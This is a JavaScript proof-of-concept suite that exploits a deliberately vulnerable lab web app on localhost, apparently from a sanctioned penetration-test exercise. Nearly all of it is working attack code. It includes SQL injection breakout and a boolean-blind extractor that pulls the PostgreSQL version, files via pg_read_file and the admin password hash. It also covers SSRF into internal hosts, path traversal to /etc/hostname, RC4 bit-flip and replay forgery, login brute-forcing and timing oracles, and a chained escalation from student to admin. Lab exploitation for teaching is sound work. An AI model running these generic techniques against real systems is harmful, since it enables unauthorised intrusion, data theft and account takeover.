'use strict';
/*
 * FINAL-POC-SUITE.js — replicable proof-of-concept suite for the
 * vulnerable-seefish penetration test (2026-10-13).
 *
 * Preconditions:
 *   - docker compose stack running (api on 127.0.0.1:3000)
 *   - Node >= 22 with fetch (host is fine; suite runs from the repo host)
 *   - lab credentials from services/api/sql/002_seed.sql:
 *       alice / StudentPass!23 (student)   tech1 / TechPass!23 (technician)
 *       bob   / StudentPass!23 (student)   admin / AdminPass!23 (admin)
 *
 * Each PoC prints its own evidence line (status codes / extracted values).
 * Mutations are reverted where possible; see per-section cleanup notes.
 *
 * Usage: node FINAL-POC-SUITE.js [P01|P02|...]   (all sections by default)
 */
const LabEnvelope = require('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/shared/protocol/envelope.js');
const { readManual } = require('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/client/manual-reader.js');
const { execSync } = require('child_process');

const BASE = 'http://127.0.0.1:3000';
const FS_TOKEN = 'FS-LAB-7f3a9c1e-4b2d-8e6f-a5c0-1d9b3e7f2a48';
const ONLY = process.argv[2] || null;
const results = [];
function section(id) { return !ONLY || ONLY === id; }
function log(id, ok, detail) {
  results.push({ id, ok });
  console.log((ok ? 'PASS ' : 'FAIL ') + id + (detail ? ' :: ' + detail : ''));
}

async function getKey() {
  const res = await fetch(BASE + '/api/session/key', { method: 'POST' });
  return res.json();
}
async function sealed(sid, key, endpoint, payload, headers = {}, envelopeOverride = null) {
  const env = envelopeOverride || LabEnvelope.seal(sid, key, payload);
  const res = await fetch(BASE + endpoint, {
    method: 'POST',
    headers: { 'content-type': 'application/json', ...headers },
    body: JSON.stringify(env)
  });
  const raw = await res.json();
  let body = null;
  if (raw && typeof raw === 'object' && typeof raw.data === 'string' && raw.data.length > 0 && !raw.error) {
    try { body = LabEnvelope.open(key, raw); } catch (e) { body = { __decryptError: e.message }; }
  } else {
    body = raw;
  }
  return { status: res.status, body };
}
async function login(sid, key, username, password) {
  const r = await sealed(sid, key, '/api/auth/login', { username, password });
  return r.body && r.body.token;
}

/* ------------------------------------------------------------------ */
async function P01_sqli() {
  // P01a: boolean breakout — student bob sees ALL rows (alice's included)
  const k = await getKey();
  const bob = await login(k.sessionId, k.key, 'bob', 'StudentPass!23');
  const all = await sealed(k.sessionId, k.key, '/api/reservations/search', { token: bob, q: "x' OR 1=1 -- " });
  const none = await sealed(k.sessionId, k.key, '/api/reservations/search', { token: bob, q: "x' AND 1=2 -- " });
  const rows = Array.isArray(all.body) ? all.body : [];
  const aliceRow = rows.find((x) => x.id === 13);
  log('P01a SQLi breakout: OR 1=1 leaks all rows, AND 1=2 none',
    all.status === 200 && rows.length >= 32 && none.body && none.body.length === 0 && aliceRow && aliceRow.ownerUsername === 'alice',
    'OR rows=' + rows.length + ' AND rows=' + (none.body ? none.body.length : '-') + ' row13.owner=' + (aliceRow && aliceRow.ownerUsername));

  // P01b: boolean-blind single-char oracle, extracting PostgreSQL version()
  const oracle = async (cond) => {
    const r = await sealed(k.sessionId, k.key, '/api/reservations/search', { token: bob, q: `x' OR ${cond} -- ` });
    return Array.isArray(r.body) && r.body.length > 0;
  };
  const extract = async (subquery) => {
    let out = '';
    for (let i = 1; i <= 40; i++) {
      const c = await oracle(`ascii(substring((${subquery}),${i},1)) > 0`);
      if (!c) break;
      let lo = 32, hi = 127;
      while (lo < hi) {
        const mid = Math.ceil((lo + hi) / 2);
        if (await oracle(`ascii(substring((${subquery}),${i},1)) < ${mid}`)) hi = mid - 1; else lo = mid;
      }
      out += String.fromCharCode(lo);
    }
    return out;
  };
  const version = await extract("select version()");
  log('P01b blind extraction of PostgreSQL version via ascii() oracle',
    version.includes('PostgreSQL'), 'version=' + version.slice(0, 60));

  // P01c: superuser privilege escalation -> OS file read on the DB container
  const hostname = await extract("select pg_read_file('/etc/hostname')");
  log('P01c pg_read_file() reads DB container /etc/hostname (superuser)',
    hostname.trim().length > 0, '/etc/hostname=' + JSON.stringify(hostname.trim()));
}

/* ------------------------------------------------------------------ */
async function P02_ssrf() {
  const k = await getKey();
  const tech = await login(k.sessionId, k.key, 'tech1', 'TechPass!23');
  // P02a: internal-only lab device admin console
  const internal = await sealed(k.sessionId, k.key, '/api/diagnostics/fetch', {
    token: tech, equipmentId: 1, target: 'http://lab-device:8080/api/admin'
  });
  const hitAdmin = internal.body && typeof internal.body.body === 'string' && internal.body.body.includes('LAB{device_admin_console_reached}');
  // P02b: loopback — the API can be made to fetch ITSELF
  const loop = await sealed(k.sessionId, k.key, '/api/diagnostics/fetch', {
    token: tech, equipmentId: 1, target: 'http://127.0.0.1:3000/api/session/key'
  });
  const hitLoop = loop.status === 200 && loop.body && Number.isInteger(loop.body.httpStatus) && typeof loop.body.body === 'string' && loop.body.body.length > 0;
  log('P02 SSRF: internal lab-device admin + API loopback',
    internal.status === 200 && hitAdmin && hitLoop,
    'admin=' + hitAdmin + ' loopback(httpStatus=' + (loop.body && loop.body.httpStatus) + ', innerBody=' + JSON.stringify((loop.body && loop.body.body || '').slice(0, 60)) + ')');
}

/* ------------------------------------------------------------------ */
async function P03_fs_token() {
  // P03a: static token alone (no login token in payload) authorizes fleet sweep
  const k = await getKey();
  const sweep = await sealed(k.sessionId, k.key, '/api/field-service/fleet-sweep', {}, { 'X-Field-Token': FS_TOKEN });
  const users = new Set((sweep.body && sweep.body.recentRuns || []).map((x) => x.requestedByUsername).filter(Boolean));
  // P03b: token ships in the client bundle (config + packed asar)
  const cfg = require('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/client/resources/lab-app-config.json');
  const inConfig = cfg && cfg.fieldService && cfg.fieldService.token === FS_TOKEN;
  let inAsar = false;
  try {
    const asar = require('fs').readFileSync('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/client/app.asar');
    inAsar = asar.indexOf(Buffer.from('FS-LAB')) !== -1;
  } catch (e) {}
  log('P03 static FS token: unauthenticated fleet sweep + token in client bundle',
    sweep.status === 200 && sweep.body.fleet && sweep.body.fleet.length >= 12 && inConfig && inAsar,
    'fleet=' + (sweep.body && sweep.body.fleet.length) + ' historyUsers=' + [...users].join(',') + ' tokenInConfig=' + inConfig + ' tokenInAsar=' + inAsar);
}

/* ------------------------------------------------------------------ */
async function P04_rc4() {
  const k = await getKey();
  const bob = await login(k.sessionId, k.key, 'bob', 'StudentPass!23');
  // P04a: two-time pad — same keystream for every message with this key
  const e1 = LabEnvelope.seal(k.sessionId, k.key, { token: bob, id: 1 });
  const e2 = LabEnvelope.seal(k.sessionId, k.key, { token: bob, id: 2 });
  const b64dec = (s) => Buffer.from(s, 'base64');
  const c1 = b64dec(e1.data), c2 = b64dec(e2.data);
  const xorCt = Buffer.from(c1.map((b, i) => b ^ (c2[i] || 0)));
  const p1 = Buffer.from(JSON.stringify({ token: bob, id: 1 }));
  const p2 = Buffer.from(JSON.stringify({ token: bob, id: 2 }));
  const xorPt = Buffer.from(p1.map((b, i) => b ^ (p2[i] || 0)));
  // P04b: bit-flip equipmentId 1 -> 2 WITHOUT the key (flip the byte that differs)
  let flipIdx = -1;
  for (let i = 0; i < c1.length; i++) if (p1[i] !== p2[i]) { flipIdx = i; break; }
  const flipped = Buffer.from(c1); flipped[flipIdx] ^= (p1[flipIdx] ^ p2[flipIdx]);
  const forgedEnv = { sid: e1.sid, alg: e1.alg, data: flipped.toString('base64') };
  const r = await sealed(k.sessionId, k.key, '/api/equipment/get', {}, {}, forgedEnv);
  // P04c: replay — resend the same sealed create twice, both rows are created
  const faultEnv = LabEnvelope.seal(k.sessionId, k.key, { token: bob, equipmentId: 9, title: 'PENTEST-P04 replay', severity: 'low' });
  const rep1 = await sealed(k.sessionId, k.key, '/api/fault-reports/create', {}, {}, faultEnv);
  const rep2 = await sealed(k.sessionId, k.key, '/api/fault-reports/create', {}, {}, faultEnv);
  // P04d: session key handed out in plaintext over plaintext HTTP
  const keyJson = await (await fetch(BASE + '/api/session/key', { method: 'POST' })).json();
  log('P04 RC4: two-time pad XOR identity + keyless bit-flip + replay + plaintext key handshake',
    xorCt.equals(xorPt) && r.status === 200 && r.body && r.body.id === 2 &&
    rep1.status === 201 && rep2.status === 201 && rep1.body.id !== rep2.body.id &&
    typeof keyJson.key === 'string' && keyJson.key.length > 0,
    'XOR(ct1,ct2)==XOR(pt1,pt2)=' + xorCt.equals(xorPt) + ' flippedId=' + (r.body && r.body.id) +
    ' replayIds=' + rep1.body.id + ',' + rep2.body.id + ' plaintextKey.len=' + keyJson.key.length);
}

/* ------------------------------------------------------------------ */
async function P05P06_electron_ipc() {
  // P05: Electron hardening — static evidence (no runtime PoC needed)
  const main = require('fs').readFileSync('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/client/main.js', 'utf8');
  const noCI = main.includes('contextIsolation: false');
  const noSand = main.includes('sandbox: false');
  const pkg = require('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/client/package.json');
  const noSandboxFlag = pkg.scripts && pkg.scripts.start && pkg.scripts.start.includes('--no-sandbox');
  log('P05 Electron hardening disabled (static)',
    noCI && noSand && noSandboxFlag,
    'contextIsolation:false=' + noCI + ' sandbox:false=' + noSand + ' --no-sandbox flag=' + noSandboxFlag);

  // P06: IPC read-file path traversal (headless reproduction of ipcMain handler)
  const memo = await readManual('../internal/ops-memo.txt');
  const host = await readManual('../../../../../../../../etc/hostname');
  log('P06 IPC read-file path traversal reads manuals/../internal + /etc/hostname',
    memo.includes('LAB{internal_notes_recovered}') && host.trim().length > 0,
    'opsMemoMarker=yes /etc/hostname=' + JSON.stringify(host.trim()));
}

/* ------------------------------------------------------------------ */
async function P07_auth_weakness() {
  // P07a: bcrypt cost 6 in stored hashes (from inside the db container)
  let hashPrefix = '';
  try {
    hashPrefix = execSync(
      'cd /home/ubuntu/Documents/Week6_v4/vulnerable-seefish && docker compose exec -T db psql -U labuser -d campus_lab -tAc "SELECT password_hash FROM users WHERE username=\'bob\'" 2>/dev/null',
      { encoding: 'utf8' }
    ).trim();
  } catch (e) {}
  // P07b: login timing oracle — existing user measurably slower than missing
  const t = async (u) => {
    const k = await getKey();
    const t0 = process.hrtime.bigint();
    await sealed(k.sessionId, k.key, '/api/auth/login', { username: u, password: 'WrongPass!99' });
    return Number(process.hrtime.bigint() - t0) / 1e6;
  };
  const samples = async (u) => { const s = []; for (let i = 0; i < 10; i++) s.push(await t(u)); s.sort((a, b) => a - b); return s[4]; };
  const medExisting = await samples('bob');
  const medMissing = await samples('nosuchuser');
  // P07c: no lockout — 30 rapid wrong-password attempts all answered, no 429
  const k = await getKey();
  let codes = new Set();
  for (let i = 0; i < 30; i++) { const r = await sealed(k.sessionId, k.key, '/api/auth/login', { username: 'bob', password: 'bad' + i }); codes.add(r.status); }
  log('P07 bcrypt cost 6 + timing oracle + no lockout',
    hashPrefix.startsWith('$2a$06$') && medExisting > medMissing * 1.4 && !codes.has(429),
    'hash=' + hashPrefix.slice(0, 7) + ' median existing=' + medExisting.toFixed(1) + 'ms vs missing=' + medMissing.toFixed(1) + 'ms; 30 attempts statuses=' + [...codes].join(','));
}

/* ------------------------------------------------------------------ */
async function P08_target_disclosure() {
  const k = await getKey();
  const alice = await login(k.sessionId, k.key, 'alice', 'StudentPass!23');
  const r = await sealed(k.sessionId, k.key, '/api/equipment/list', { token: alice });
  const rows = Array.isArray(r.body) ? r.body : [];
  const withTarget = rows.filter((x) => x.diagnosticTarget).length;
  log('P08 student sees internal diagnosticTarget on every equipment row',
    withTarget === rows.length && withTarget >= 12,
    withTarget + '/' + rows.length + ' rows expose e.g. ' + (rows[0] && rows[0].diagnosticTarget));
}

/* ------------------------------------------------------------------ */
async function P09_sessions() {
  // P09: rc4_sessions stores key_b64 in cleartext + unbounded minting
  let keySample = '';
  try {
    keySample = execSync(
      'cd /home/ubuntu/Documents/Week6_v4/vulnerable-seefish && docker compose exec -T db psql -U labuser -d campus_lab -tAc "SELECT key_b64 FROM rc4_sessions ORDER BY created_at DESC LIMIT 1" 2>/dev/null',
      { encoding: 'utf8' }
    ).trim();
  } catch (e) {}
  // unbounded minting: count rows before, mint 10, count again
  let before = -1, after = -1;
  try {
    const cnt = (() => execSync(
      'cd /home/ubuntu/Documents/Week6_v4/vulnerable-seefish && docker compose exec -T db psql -U labuser -d campus_lab -tAc "SELECT count(*) FROM rc4_sessions" 2>/dev/null',
      { encoding: 'utf8' }
    ).trim());
    before = parseInt(cnt(), 10);
    for (let i = 0; i < 10; i++) await (await fetch(BASE + '/api/session/key', { method: 'POST' })).json();
    after = parseInt(cnt(), 10);
  } catch (e) {}
  log('P09 cleartext session keys + unbounded unauthenticated minting',
    keySample.length > 0 && before > 0 && after - before === 10,
    'storedKey_b64=' + keySample.slice(0, 12) + '... rows before=' + before + ' after=' + after);
}

/* ------------------------------------------------------------------ */
async function P10_logout_no_revoke() {
  // P10: logout revokes only the app token; the RC4 session sid stays usable
  const k = await getKey();
  const bob = await login(k.sessionId, k.key, 'bob', 'StudentPass!23');
  const sid = k.sessionId;
  const lo = await sealed(sid, k.key, '/api/auth/logout', { token: bob });
  const after = await sealed(sid, k.key, '/api/auth/me', { token: bob });
  const relogin = await login(sid, k.key, 'bob', 'StudentPass!23');
  // static: revokeSession is defined but has ZERO callers in the API
  let callers = '0';
  try {
    callers = execSync(
      "cd /home/ubuntu/Documents/Week6_v4/vulnerable-seefish/services/api && grep -rn 'revokeSession' src/ | grep -v 'sessions.js' | wc -l",
      { encoding: 'utf8' }
    ).trim();
  } catch (e) {}
  log('P10 logout does not revoke RC4 session; same sid re-login succeeds',
    lo.status === 200 && after.status === 401 && !!relogin && callers === '0',
    'logout=' + lo.status + ' postLogoutMe=' + after.status + ' reLoginSameSid=' + (relogin ? '200' : 'failed') + ' revokeSessionCallers=' + callers);
}

/* ------------------------------------------------------------------ */
async function P11_token_no_expiry() {
  // P11: app tokens live in an in-memory Map with createdAt only — no TTL,
  // no expiry check, no admin revocation endpoint (appTokens.js:16-34)
  const k = await getKey();
  const bob = await login(k.sessionId, k.key, 'bob', 'StudentPass!23');
  const me = await sealed(k.sessionId, k.key, '/api/auth/me', { token: bob });
  const src = require('fs').readFileSync('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/services/api/src/appTokens.js', 'utf8');
  const noExpiry = !src.includes('expires') && src.includes('createdAt') && /resolveToken\(token\) \{[\s\S]*?return tokens\.get\(token\) \|\| null/.test(src);
  log('P11 app tokens never expire (no TTL, no expiry check)',
    me.status === 200 && me.body && me.body.user && me.body.user.username === 'bob' && noExpiry,
    'me=' + me.status + ' username=' + (me.body && me.body.user && me.body.user.username) + ' noExpiryPathInSource=' + noExpiry);
}

/* ------------------------------------------------------------------ */
async function P12_booking_gaps() {
  const k = await getKey();
  const bob = await login(k.sessionId, k.key, 'bob', 'StudentPass!23');
  const mk = (eq, startsAt, endsAt, purpose) => sealed(k.sessionId, k.key, '/api/reservations/create', {
    token: bob, equipmentId: eq, startsAt, endsAt, purpose
  });
  // past window (2020)
  const past = await mk(3, '2020-01-01T09:00:00.000Z', '2020-01-01T10:00:00.000Z', 'PENTEST-P12 past');
  // 3-year duration (far-future clean window)
  const long = await mk(5, '2031-01-01T09:00:00.000Z', '2034-01-01T09:00:00.000Z', 'PENTEST-P12 3year');
  // 10,000-char purpose (EQ-1008, clean window)
  const big = await mk(8, '2031-03-01T09:00:00.000Z', '2031-03-01T10:00:00.000Z', 'P'.repeat(10000));
  // reserved-status equipment is bookable (EQ-1007)
  const reserved = await mk(7, '2031-04-01T09:00:00.000Z', '2031-04-01T10:00:00.000Z', 'PENTEST-P12 reserved-eq');
  // per-user quota: 8 bookable devices, same window
  const win = new Date(Date.now() + 400 * 24 * 3600 * 1000).toISOString();
  const winEnd = new Date(Date.parse(win) + 3600 * 1000).toISOString();
  const quota = [];
  for (const eq of [1, 2, 3, 5, 6, 7, 8, 10]) quota.push(await mk(eq, win, winEnd, 'PENTEST-P12 quota-' + eq));
  const quotaOk = quota.filter((r) => r.status === 201).length;
  // cleanup
  for (const r of [past, long, big, reserved, ...quota]) {
    if (r.body && r.body.id) await sealed(k.sessionId, k.key, '/api/reservations/update', { token: bob, id: r.body.id, status: 'cancelled' });
  }
  log('P12 booking gaps: past/3year/10k-char/reserved-eq/no-quota all accepted',
    past.status === 201 && long.status === 201 && big.status === 201 && reserved.status === 201 && quotaOk >= 8,
    'past=' + past.status + ' 3year=' + long.status + ' 10kChar=' + big.status + ' reservedEq7=' + reserved.status + ' quota=' + quotaOk + '/8 (all cancelled after)');
}

/* ------------------------------------------------------------------ */
async function P13_race() {
  // EXACTLY 2 concurrent identical creates, 10 rounds — expect ~50% double-201
  const k = await getKey();
  const bob = await login(k.sessionId, k.key, 'bob', 'StudentPass!23');
  let dbl = 0; const created = [];
  for (let round = 0; round < 10; round++) {
    const start = new Date(Date.now() + (500 + round) * 24 * 3600 * 1000).toISOString();
    const ends = new Date(Date.parse(start) + 3600 * 1000).toISOString();
    const mk = () => sealed(k.sessionId, k.key, '/api/reservations/create', {
      token: bob, equipmentId: 5, startsAt: start, endsAt: ends, purpose: 'PENTEST-P13-' + round
    });
    const rs = await Promise.all([mk(), mk()]);
    const ok = rs.filter((r) => r.status === 201);
    if (ok.length === 2) dbl++;
    for (const r of ok) if (r.body && r.body.id) created.push(r.body.id);
  }
  for (const id of created) await sealed(k.sessionId, k.key, '/api/reservations/update', { token: bob, id, status: 'cancelled' });
  log('P13 TOCTOU double-booking race (2 concurrent requests/round)',
    dbl > 0, dbl + '/10 rounds produced TWO accepted bookings for the SAME equipment+window (all cancelled after)');
}

/* ------------------------------------------------------------------ */
async function P14_tech_entitlement() {
  const k = await getKey();
  const alice = await login(k.sessionId, k.key, 'alice', 'StudentPass!23');
  const tech = await login(k.sessionId, k.key, 'tech1', 'TechPass!23');
  // P14a (BL-1): report AND resolve own critical fault — no review
  const f = await sealed(k.sessionId, k.key, '/api/fault-reports/create', { token: tech, equipmentId: 5, title: 'PENTEST-P14 self-approval', severity: 'critical' });
  const fUp = f.body && f.body.id ? await sealed(k.sessionId, k.key, '/api/fault-reports/update', { token: tech, id: f.body.id, status: 'resolved', resolution: 'same tech, no review' }) : null;
  // P14b (BL-4): technician cancels a STUDENT's reservation, no audit row
  const st = new Date(Date.now() + 600 * 24 * 3600 * 1000).toISOString();
  const en = new Date(Date.parse(st) + 3600 * 1000).toISOString();
  const res = await sealed(k.sessionId, k.key, '/api/reservations/create', { token: alice, equipmentId: 8, startsAt: st, endsAt: en, purpose: 'PENTEST-P14 victim' });
  const resUp = res.body && res.body.id ? await sealed(k.sessionId, k.key, '/api/reservations/update', { token: tech, id: res.body.id, status: 'cancelled' }) : null;
  // P14c (BL-5): technician retires equipment with no admin approval (then revert)
  const ret = await sealed(k.sessionId, k.key, '/api/equipment/update', { token: tech, id: 10, status: 'retired' });
  await sealed(k.sessionId, k.key, '/api/equipment/update', { token: tech, id: 10, status: 'available' });
  let auditCount = 0;
  try {
    auditCount = parseInt(execSync(
      'cd /home/ubuntu/Documents/Week6_v4/vulnerable-seefish && docker compose exec -T db psql -U labuser -d campus_lab -tAc "SELECT count(*) FROM audit_log WHERE action LIKE \'%reservation%\'" 2>/dev/null',
      { encoding: 'utf8' }
    ).trim(), 10) || 0;
  } catch (e) {}
  log('P14 technician over-entitlement: self-approval + cross-user cancel + unilateral retire',
    f.status === 201 && fUp && fUp.status === 200 && fUp.body.status === 'resolved' &&
    res.status === 201 && resUp && resUp.status === 200 && resUp.body.status === 'cancelled' &&
    ret.status === 200 && ret.body.status === 'retired',
    'selfResolve=' + (fUp && fUp.body.status) + ' techCancelledStudentRes=' + (resUp && resUp.body.status) +
    ' retiredThenReverted=' + ret.body.status + '->available; reservationAuditRows=' + auditCount);
}

/* ------------------------------------------------------------------ */
async function P15_workflow_gaps() {
  const k = await getKey();
  const bob = await login(k.sessionId, k.key, 'bob', 'StudentPass!23');
  const tech = await login(k.sessionId, k.key, 'tech1', 'TechPass!23');
  // P15a (BL-2): equipment -> maintenance leaves active reservation alive
  const st = new Date(Date.now() + 700 * 24 * 3600 * 1000).toISOString();
  const en = new Date(Date.parse(st) + 3600 * 1000).toISOString();
  const res = await sealed(k.sessionId, k.key, '/api/reservations/create', { token: bob, equipmentId: 6, startsAt: st, endsAt: en, purpose: 'PENTEST-P15 survivor' });
  let survivor = false;
  if (res.body && res.body.id) {
    await sealed(k.sessionId, k.key, '/api/equipment/update', { token: tech, id: 6, status: 'maintenance' });
    const probe = await sealed(k.sessionId, k.key, '/api/reservations/create', { token: bob, equipmentId: 6, startsAt: st, endsAt: en, purpose: 'probe' });
    survivor = probe.status === 409; // still blocked by the ACTIVE survivor row
    await sealed(k.sessionId, k.key, '/api/reservations/update', { token: bob, id: res.body.id, status: 'cancelled' });
    await sealed(k.sessionId, k.key, '/api/equipment/update', { token: tech, id: 6, status: 'available' });
  }
  // P15b (BL-3): booking equipment that has an OPEN CRITICAL fault (EQ-1005)
  const cf = await sealed(k.sessionId, k.key, '/api/fault-reports/create', { token: tech, equipmentId: 5, title: 'PENTEST-P15 critical open', severity: 'critical' });
  const book = await sealed(k.sessionId, k.key, '/api/reservations/create', {
    token: bob, equipmentId: 5, startsAt: new Date(Date.now() + 800 * 24 * 3600 * 1000).toISOString(),
    endsAt: new Date(Date.now() + 800 * 24 * 3600 * 1000 + 3600 * 1000).toISOString(), purpose: 'PENTEST-P15 despite-critical'
  });
  if (book.body && book.body.id) await sealed(k.sessionId, k.key, '/api/reservations/update', { token: bob, id: book.body.id, status: 'cancelled' });
  if (cf.body && cf.body.id) await sealed(k.sessionId, k.key, '/api/fault-reports/update', { token: tech, id: cf.body.id, status: 'resolved', resolution: 'cleanup' });
  // P15c (BL-6): fault filed on RETIRED equipment accepted
  const rf = await sealed(k.sessionId, k.key, '/api/fault-reports/create', { token: tech, equipmentId: 12, title: 'PENTEST-P15 on-retired', severity: 'low' });
  if (rf.body && rf.body.id) await sealed(k.sessionId, k.key, '/api/fault-reports/update', { token: tech, id: rf.body.id, status: 'resolved', resolution: 'cleanup' });
  // P15d (BL-7): update extends a booking to a 10-year window
  const r2 = await sealed(k.sessionId, k.key, '/api/reservations/create', {
    token: bob, equipmentId: 3, startsAt: new Date(Date.now() + 900 * 24 * 3600 * 1000).toISOString(),
    endsAt: new Date(Date.now() + 900 * 24 * 3600 * 1000 + 3600 * 1000).toISOString(), purpose: 'PENTEST-P15 ext'
  });
  let ext = null;
  if (r2.body && r2.body.id) {
    ext = await sealed(k.sessionId, k.key, '/api/reservations/update', {
      token: bob, id: r2.body.id, endsAt: new Date(Date.now() + 900 * 24 * 3600 * 1000 + 10 * 365 * 24 * 3600 * 1000).toISOString()
    });
    await sealed(k.sessionId, k.key, '/api/reservations/update', { token: bob, id: r2.body.id, status: 'cancelled' });
  }
  // P15e (BL-10): diagnostics run on RETIRED equipment accepted (no state check;
  // 502 fetch_failed still proves the run was accepted and attempted)
  const drun = await sealed(k.sessionId, k.key, '/api/diagnostics/run', { token: tech, equipmentId: 12 });
  const diagAccepted = drun.status === 200 || (drun.status === 502 && drun.body && drun.body.error === 'fetch_failed');
  log('P15 workflow gaps: maintenance-survivor, book-despite-critical, fault-on-retired, 10y-update, diag-on-retired',
    survivor && book.status === 201 && rf.status === 201 && ext && ext.status === 200 && diagAccepted,
    'survivorBlocking=' + survivor + ' bookDespiteCritical=' + book.status + ' faultOnRetired=' + rf.status +
    ' 10yUpdate=' + (ext && ext.status) + ' diagOnRetired=' + drun.status + (drun.body && drun.body.error ? '(' + drun.body.error + ')' : '') + ' (all cleaned up)');
}

/* ------------------------------------------------------------------ */
async function P16_error_echo() {
  const k = await getKey();
  const tech = await login(k.sessionId, k.key, 'tech1', 'TechPass!23');
  const r = await sealed(k.sessionId, k.key, '/api/diagnostics/fetch', { token: tech, equipmentId: 1, target: 'not-a-url' });
  log('P16 error message reflects attacker-supplied URL (CWE-209)',
    r.status === 502 && r.body && typeof r.body.message === 'string' && r.body.message.includes('not-a-url'),
    r.status + ' message=' + JSON.stringify(r.body && r.body.message));
}

/* ------------------------------------------------------------------ */
async function P18_chainA() {
  // CHAIN A: student -> SQLi -> superuser DB -> admin hash -> crack -> admin -> SSRF -> internal device
  const k = await getKey();
  const bob = await login(k.sessionId, k.key, 'bob', 'StudentPass!23'); // step 1: lowest privilege
  // step 2: blind SQLi extracts admin's bcrypt hash (F01 + superuser M5)
  const oracle = async (cond) => {
    const r = await sealed(k.sessionId, k.key, '/api/reservations/search', { token: bob, q: `x' OR ${cond} -- ` });
    return Array.isArray(r.body) && r.body.length > 0;
  };
  const extract = async (subquery) => {
    let out = '';
    for (let i = 1; i <= 80; i++) {
      const c = await oracle(`ascii(substring((${subquery}),${i},1)) > 0`);
      if (!c) break;
      let lo = 32, hi = 127;
      while (lo < hi) {
        const mid = Math.ceil((lo + hi) / 2);
        if (await oracle(`ascii(substring((${subquery}),${i},1)) < ${mid}`)) hi = mid - 1; else lo = mid;
      }
      out += String.fromCharCode(lo);
    }
    return out;
  };
  const adminHash = await extract("select password_hash from users where username='admin'");
  // step 3: tiny dictionary crack (cost 6 makes even large dictionaries cheap);
  // verified via the login endpoint itself — no bcrypt dependency needed
  const dict = ['admin', 'password', 'admin123', 'Admin123', 'AdminPass123', 'AdminPass!23', 'AdminPass!2023', 'adminpass', 'letmein', 'adminadmin'];
  let cracked = null;
  for (const cand of dict) {
    const t = await login(k.sessionId, k.key, 'admin', cand);
    if (t) { cracked = cand; break; }
  }
  // step 4: admin pivots via SSRF into the internal-only device admin console
  let flag = null;
  if (cracked) {
    const adminToken = await login(k.sessionId, k.key, 'admin', cracked);
    const r = await sealed(k.sessionId, k.key, '/api/diagnostics/fetch', { token: adminToken, equipmentId: 1, target: 'http://lab-device:8080/api/admin' });
    if (r.body && typeof r.body.body === 'string') flag = r.body.body.slice(0, 500);
  }
  log('P18 CHAIN-A student->SQLi->hash-crack->admin->SSRF->internal device admin',
    adminHash.startsWith('$2a$06$') && cracked === 'AdminPass!23' && flag && flag.includes('LAB{device_admin_console_reached}'),
    'adminHash=' + adminHash.slice(0, 10) + '... cracked=' + JSON.stringify(cracked) + ' devicePayload=' + JSON.stringify(flag));
}

/* ------------------------------------------------------------------ */
async function P17_hygiene() {
  let apiUser = '', devUser = '';
  try {
    apiUser = execSync('cd /home/ubuntu/Documents/Week6_v4/vulnerable-seefish && docker compose exec -T api whoami 2>/dev/null', { encoding: 'utf8' }).trim();
    devUser = execSync('cd /home/ubuntu/Documents/Week6_v4/vulnerable-seefish && docker compose exec -T lab-device whoami 2>/dev/null', { encoding: 'utf8' }).trim();
  } catch (e) {}
  const fs = require('fs');
  const dockerfile = fs.readFileSync('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/services/api/Dockerfile', 'utf8');
  const copiesPoC = dockerfile.includes('spoilers/poc');
  const noDockerignore = !fs.existsSync('/home/ubuntu/Documents/Week6_v4/vulnerable-seefish/.dockerignore');
  log('P17 hygiene: root containers + PoC in image + no .dockerignore',
    apiUser === 'root' && devUser === 'root' && copiesPoC && noDockerignore,
    'apiUid=' + apiUser + ' deviceUid=' + devUser + ' DockerfileCOPYspoilers=' + copiesPoC + ' dockerignoreMissing=' + noDockerignore);
}

/* ------------------------------------------------------------------ */
async function main() {
  console.log('=== FINAL PoC SUITE — vulnerable-seefish (2026-10-13) ===\n');
  if (section('P01')) await P01_sqli();
  if (section('P02')) await P02_ssrf();
  if (section('P03')) await P03_fs_token();
  if (section('P04')) await P04_rc4();
  if (section('P05') || section('P06')) await P05P06_electron_ipc();
  if (section('P07')) await P07_auth_weakness();
  if (section('P08')) await P08_target_disclosure();
  if (section('P09')) await P09_sessions();
  if (section('P10')) await P10_logout_no_revoke();
  if (section('P11')) await P11_token_no_expiry();
  if (section('P12')) await P12_booking_gaps();
  if (section('P13')) await P13_race();
  if (section('P14')) await P14_tech_entitlement();
  if (section('P15')) await P15_workflow_gaps();
  if (section('P16')) await P16_error_echo();
  if (section('P17')) await P17_hygiene();
  if (section('P18')) await P18_chainA();
  console.log('\n=== summary: ' + results.filter((r) => r.ok).length + '/' + results.length + ' PoCs replicated ===');
}

main().catch((e) => { console.error('FATAL', e); process.exit(1); });
